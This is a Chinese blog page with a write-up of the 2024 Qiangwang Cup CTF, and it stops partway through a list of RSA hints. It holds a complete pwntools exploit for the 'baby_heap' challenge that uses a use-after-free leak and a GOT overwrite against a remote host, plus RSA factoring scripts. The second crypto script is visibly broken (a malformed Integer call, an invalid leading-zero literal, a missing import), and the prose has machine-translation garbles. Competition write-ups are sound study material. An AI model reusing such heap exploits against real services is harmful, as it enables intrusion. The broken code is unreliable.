<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2024年强网杯 | T1ng的摆烂日常</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="2024年强网杯2024强网杯Writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="2024年强网杯">
<meta property="og:url" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/index.html">
<meta property="og:site_name" content="T1ng的摆烂日常">
<meta property="og:description" content="2024年强网杯2024强网杯Writeup">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d2d12dac39c3241fcf2eaf99ada98018.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/b93dfec67a545e597219f5eaf1fc497d.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6fcbafe292cebf19bb98913a16f87456.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/422488f29d2c681857e2e52617ffbab8.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/f18c3f0c4547c8c6a2692057e419e985.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/11de63f16ffebf352414b16ae38860ba.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/01022457ce17ee94744f24df24842cca.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6d7ad3b5202ca8f312cd97439e3465cc.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/026eef010e83bf80300c89c96312b70b.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/beabedf09db1691806bef2b6c6391f1d.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/061841ed5a27f8ac4a7193bcd9892650.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0b9605340670a068dd34a5b6f999d1ee.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/aea5827cbd12a9186ba39ecb57fe64dd.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/5aafd82ed59a6cd9939d61d3df179c25.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/8680725a5649db49dd28fdfa02607086.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d61e37c0b7d24b69837faadb8d64d382.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/79c0af720c41b42bcea82e9d2e5ee856.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/be4f79fea875cff217a263311aa86a29.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/72137578a280d13e030ec52cfd7a7b1a.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/9eb140e7f758b9220df8a07ad4e132a3.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d3b8946e2a66c168a4204fc7f04b7b99.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/cb983b2fb43bc69dadb8c2637f6a68dd.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7cce39b65b7d20ba4020f8d78ec6a461.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7599130e4d18339cb931219923e44a12.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7d41c9e2e0d02f0b8e767985d0d8dd88.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/3c83b3b35db916589755512762cf70c7.jpg">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6afbeabdb6cfd8c12778aaa6aa4e68a4.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/29a48d711750a8fa1f7f7d52e6f85860.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/28c0e51653cfc697d0e688163acd7d8d.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0ac76df0df7cb7fdac193c4dc11da230.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/465de9349af0810da54409adaa765f16.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/ba5467ca2a83f85d681f5f80a5b2380f.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/9ed0304dd7a3b90c9999a0b1df611a51.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/60eb7b4759e72f1aed5103b64f812e60.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e6b564709a0212e542490c00bde670f1.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/4b32b60ac50ec3cc79e8b85d7916d2e6.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/5dd8880a2f51bc7282e56b1b80a6493f.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6a6cde1e3eaf04849a955da162c87ba2.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/81ce481aed80b364cdd762a059070069.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/82651994f2774ed4ab4bbc2170fe8414.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/f0ae3a7566f5ec658b76279fa63cb13c.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/33aca511e2a909003d2a656b40ce76f4.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/2f14b89d712eaaf3d40fd4a889488411.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e227cfb2844a0c84697957d9004d7422.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/61926f17ecdfcf7d610fa3dcd3b13921.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6c88eee2b7e07c4fa9524a3c4522fb07.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/a57b8525a5484f8de364d7f32d307576.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0ebcec49621e56c347155e95f8a67198.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6b7dda1e7cdc7875f34c32ee5c28708f.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e1e8486d894cd10da0ec2ecbe21777e4.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d168b1de851417ddc73ce6caee30c9eb.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/738ddb6b27313f609dc9ddca236ed7ee.png">
<meta property="og:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/c9390bf6e8e517b4811cc7b49bb242d6.png">
<meta property="article:published_time" content="2024-11-28T20:43:24.000Z">
<meta property="article:modified_time" content="2024-11-28T20:46:35.769Z">
<meta property="article:author" content="T1ng">
<meta property="article:tag" content="Race">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d2d12dac39c3241fcf2eaf99ada98018.png">
  
    <link rel="alternative" href="/atom.xml" title="T1ng的摆烂日常" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/t1ng.png" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">T1ng</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Code/" style="font-size: 20px;">Code</a> <a href="/tags/Race/" style="font-size: 10px;">Race</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a developer.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/t1ng.png" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-2024强网杯" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="article-date">
  	<time datetime="2024-11-28T20:43:24.000Z" itemprop="datePublished">2024-11-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2024年强网杯
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Race/" rel="tag">Race</a></li></ul>
	</div>

        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2024年强网杯"><a href="#2024年强网杯" class="headerlink" title="2024年强网杯"></a>2024年强网杯</h1><h2 id="2024强网杯Writeup"><a href="#2024强网杯Writeup" class="headerlink" title="2024强网杯Writeup"></a>2024强网杯Writeup</h2><span id="more"></span>

<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h3><p>发现可能利用的漏洞点：<br><strong>功能菜单</strong>：</p>
<ul>
<li>“菜单：1.添加商品2.删除商品3.编辑商品4.显示商品5.保密信息”</li>
<li>这些选项提示了用户可以在程序中进行的操作，表明该程序可能实现了一个“商品管理”系统，涉及堆分配（添加商品）、删除（删除）、编辑（编辑）和显示（显示）。</li>
</ul>
<p><strong>输出验证提示</strong>：</p>
<ul>
<li>“输入您的商品大小”、“堆已满！”、“内存分配失败”等字符串提示程序涉及堆操作，并可能有内存管理操作的限制。</li>
</ul>
<p>由此可知本体可能是涉及堆操作，有内存管理操作限制。释放后访问的漏洞( <code>UAF</code>)，加上对GOT表的覆盖，实现远程代码执行。</p>
<p><strong>堆块分配与资源</strong>：</p>
<ul>
<li>申请两个堆块，<code>malloc(0x700)</code>分配一个大的堆块空间，<code>malloc(0x10)</code>分配一个较小的堆块。</li>
<li><code>free(1)</code>释放小块堆，以触发后续的漏洞。</li>
</ul>
<p><strong>泄漏地址</strong>：</p>
<ul>
<li><p><code>show(1)</code>查看被释放的堆块内容，利用UAF（Use-After-Free）技术获取堆块或<code>libc</code>地址信息。</p>
</li>
<li><p><code>libc_base_addr = u64(p.recv(8)) - 0x21ace0</code>：读取漏地址，通过偏移计算出<code>libc</code>的基地址。</p>
</li>
<li><p>计算目标函数在GOT表中的地址：<code>got = libc_base_addr + 0x21A118</code>。</p>
</li>
<li><p>通过<code>sla(&#39;: &#39;, &#39;0&#39;)</code>进入自定义功能，利用漏洞覆盖GOT表地址，将其指向<code>puts</code>函数的地址。</p>
</li>
</ul>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程服务器连接</span></span><br><span class="line">server = remote(<span class="string">&quot;47.94.151.65&quot;</span>, <span class="number">34902</span>)  <span class="comment"># 替换为远程目标 IP 和端口</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)  <span class="comment"># 加载本地的 libc 文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义快捷操作函数</span></span><br><span class="line">recv_data = <span class="keyword">lambda</span> *args: server.recv(*args)  </span><br><span class="line">recv_until = <span class="keyword">lambda</span> x: server.recvuntil(x)</span><br><span class="line">send_line = <span class="keyword">lambda</span> x: server.sendline(x)</span><br><span class="line">send_data = <span class="keyword">lambda</span> x: server.send(x)</span><br><span class="line">send_after = <span class="keyword">lambda</span> prompt, data: server.sendafter(prompt, data)</span><br><span class="line">send_line_after = <span class="keyword">lambda</span> prompt, data: server.sendlineafter(prompt, data)</span><br><span class="line">log_msg = <span class="keyword">lambda</span> *args: log.success(*args)</span><br><span class="line">interact = <span class="keyword">lambda</span>: server.interactive()</span><br><span class="line">pause = <span class="keyword">lambda</span> sec: time.sleep(sec)</span><br><span class="line">padding = <span class="keyword">lambda</span> x: x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_chunk</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;请求一个大小为 size 的堆块&quot;&quot;&quot;</span></span><br><span class="line">    send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    send_line_after(<span class="string">&#x27;e &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放指定索引的堆块&quot;&quot;&quot;</span></span><br><span class="line">    send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inspect_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查看特定索引的堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    send_line_after(<span class="string">&#x27;: \n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    recv_until(<span class="string">&#x27;here \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用过程实现</span></span><br><span class="line">request_chunk(<span class="number">0x700</span>)  <span class="comment"># 分配较大的堆块</span></span><br><span class="line">request_chunk(<span class="number">0x10</span>)   <span class="comment"># 分配一个小块</span></span><br><span class="line">release_chunk(<span class="number">1</span>)      <span class="comment"># 释放小块以供后续泄漏</span></span><br><span class="line">inspect_chunk(<span class="number">1</span>)      <span class="comment"># 尝试泄漏信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析泄漏的 libc 基地址</span></span><br><span class="line">libc_addr_base = u64(recv_data(<span class="number">8</span>)) - <span class="number">0x21ace0</span>  <span class="comment"># 基地址计算</span></span><br><span class="line">got_target = libc_addr_base + <span class="number">0x00000000021A118</span>  <span class="comment"># 目标 GOT 表项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 GOT 表以进行重定向</span></span><br><span class="line">send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">send_data(padding(got_target))</span><br><span class="line">send_data(padding(libc_addr_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终触发并交互</span></span><br><span class="line">send_line_after(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">send_line(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">interact()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="apdq"><a href="#apdq" class="headerlink" title="apdq"></a>apdq</h3><p>代码实现了三个阶段的RSA加密<br><strong>第 1 阶段</strong>：提供<code>p + q</code>有价值的提示</p>
<ul>
<li>生成第一个RSA密钥对<code>(prikey1, pubkey1)</code>。</li>
<li>使用该密钥对加密<code>flag</code>的第一部分，并输出蜡烛、密文和提示<code>p + q</code>的值。</li>
</ul>
<p><strong>第 2 阶段</strong>：提供随机整数<code>a[i]*p + b[i]*q</code>的集合作为提示</p>
<ul>
<li>生成第二个RSA密钥对<code>(prikey2, pubkey2)</code>。</li>
<li>使用该密钥对加密<code>flag</code>的第二部分，并输出公钥、密文和100个值的列表，其中每个值<code>a[i]*p + b[i]*q</code>。</li>
</ul>
<p><strong>第三阶段</strong>：提供两个线索<code>a*p + q</code>和<code>p + b*q</code>价值</p>
<ul>
<li>生成第三个RSA密钥对<code>(prikey3, pubkey3)</code>。</li>
<li>使用该密钥对加密<code>flag</code>的第三部分，并输出蜡烛、密文和两条线索<code>a*p + q</code>和<code>p + b*q</code>。</li>
</ul>
<h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><ul>
<li><p><strong>给定数据</strong>：</p>
<ul>
<li><code>N</code>：RSA的模数，即<code>N = p * q</code>，其中<code>p</code>和<code>q</code>是两个素数。</li>
<li><code>e</code>: 全局指数，常用的值<code>65537</code>。</li>
<li><code>hint1</code>: 给出线索，即是<code>p + q</code>值。</li>
<li><code>enc1</code>: 加密文，加密后的消息。</li>
</ul>
</li>
<li><p>**求解<code>p</code>和<code>q</code>的函数<code>solve_p_q</code>**：</p>
<ul>
<li>假设<code>N</code>和<code>p + q</code>已知，利用第二个方程推导出<code>p</code>和<code>q</code>。</li>
<li>使用判别式<code>b^2 - 4N</code>，计算其整数平方根。</li>
<li>如果平方根的平方相等判别式，则求得<code>p</code>和<code>q</code>的值，并验证它们是否为素数。</li>
</ul>
</li>
<li><p><strong>解密过程</strong>：</p>
<ul>
<li>使用<code>p</code>和<code>q</code>计算欧拉函数<code>phi_n = (p - 1) * (q - 1)</code>。</li>
<li>计算私钥<code>d</code>，是<code>e</code>关于<code>phi_n</code>模逆的。</li>
<li>使用私钥<code>d</code>对密文<code>enc1</code>进行解密。</li>
</ul>
</li>
</ul>
<h5 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h5><p>exp1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import Integer</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"># 初始化 RSA 系统的参数</span><br><span class="line">N = Integer(89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589)</span><br><span class="line">e = Integer(65537)</span><br><span class="line">hint1 = Integer(18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170)</span><br><span class="line">enc1 = Integer(23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247)</span><br><span class="line"></span><br><span class="line"># 通过 N 和 p + q 的和推导出 p 和 q</span><br><span class="line">def factorize_n_with_hint(n, sum_pq):</span><br><span class="line">    discriminant = sum_pq**2 - 4 * n</span><br><span class="line">    sqrt_d = discriminant.isqrt()  # 计算整数平方根</span><br><span class="line"></span><br><span class="line">    if sqrt_d**2 == discriminant:</span><br><span class="line">        p = (sum_pq + sqrt_d) // 2</span><br><span class="line">        q = sum_pq - p</span><br><span class="line">        return (p, q) if p.is_prime() and q.is_prime() else (None, None)</span><br><span class="line">    return None, None</span><br><span class="line"></span><br><span class="line"># 解密函数，根据给定的 p 和 q，计算私钥并解密密文</span><br><span class="line">def decrypt_rsa(enc, n, e, p, q):</span><br><span class="line">    phi_n = (p - 1) * (q - 1)</span><br><span class="line">    try:</span><br><span class="line">        d = inverse(e, phi_n)</span><br><span class="line">        decrypted_int = pow(enc, d, n)</span><br><span class="line">        return long_to_bytes(int(decrypted_int))</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"># 主流程，分解 N 并解密 enc1</span><br><span class="line">p, q = factorize_n_with_hint(N, hint1)</span><br><span class="line">if p and q:</span><br><span class="line">    plaintext = decrypt_rsa(enc1, N, e, p, q)</span><br><span class="line">    if plaintext:</span><br><span class="line">        print(&quot;解密得到的明文：&quot;, plaintext)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;解密失败，私钥计算错误。&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;分解 N 失败，未找到有效的 p 和 q。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d2d12dac39c3241fcf2eaf99ada98018.png"></p>
<p>得到第一部分的flag<br>解密得到的明文： b’flag{yOu_can_’</p>
<h5 id="第二部分，第三部分"><a href="#第二部分，第三部分" class="headerlink" title="第二部分，第三部分"></a>第二部分，第三部分</h5><p>利用RSA加密的数学特性，通过提示信息( <code>hints</code>)和矩阵缩减技术来分层<code>n</code>并获得解密，最终对密文进行解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse, GCD</span><br><span class="line">from sage.all import Matrix, gcd</span><br><span class="line"></span><br><span class="line"># 假设我们有 n、e 和密文 enc2, enc3 的值</span><br><span class="line">n = Integer(73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)  </span><br><span class="line"></span><br><span class="line">e = Integer(65537)</span><br><span class="line">enc2 = Integer(030332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244)  </span><br><span class="line"></span><br><span class="line">enc3 = Integer(17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 